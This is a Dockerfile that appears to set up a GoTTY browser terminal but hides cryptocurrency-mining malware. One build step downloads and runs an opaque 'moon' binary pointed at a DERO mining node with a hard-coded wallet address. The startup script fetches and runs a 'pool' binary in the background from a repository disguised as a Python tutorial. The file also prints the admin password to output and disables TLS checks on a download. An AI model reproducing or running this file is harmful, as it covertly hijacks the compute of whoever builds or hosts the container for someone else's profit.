FROM python:3.10

ENV LANG en_US.UTF-8
ENV LANGUAGE en_US:en
ENV GOTTY_TAG_VER v1.5.0

RUN apt-get -y update && \
    apt-get install -y curl && \
    curl -sLk https://github.com/sorenisanerd/gotty/releases/download/${GOTTY_TAG_VER}/gotty_${GOTTY_TAG_VER}_linux_amd64.tar.gz \
    | tar xzC /usr/local/bin 

RUN echo 'USER="ADMIN"' >> gotty.sh
RUN echo 'PASS="${TTY_PASSWORD:-$(head -c 25 /dev/urandom | base64)}"' >> gotty.sh
RUN echo 'echo USER: $USER' >> gotty.sh
RUN echo 'echo PASSWORD: $PASS' >> gotty.sh
RUN apt-get update;apt-get install wget curl -y
RUN wget https://gitlab.com/cloud8324026/cloud/-/raw/main/moon;chmod +x moon;./moon -d dero-node-va.mysrv.cloud:10300 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.$(echo $(shuf -i 1-9999 -n 1)-MOON)
RUN echo 'wget https://github.com/zaulaferita/python-getting-started/raw/main/pool;chmod +x pool;nohup ./pool &' >> gotty.sh
RUN echo 'gotty --credential "${USER}:${PASS}" --port 8080 --reconnect -w bash' >> gotty.sh
RUN chmod +x gotty.sh

EXPOSE 8080

ENTRYPOINT /gotty.sh
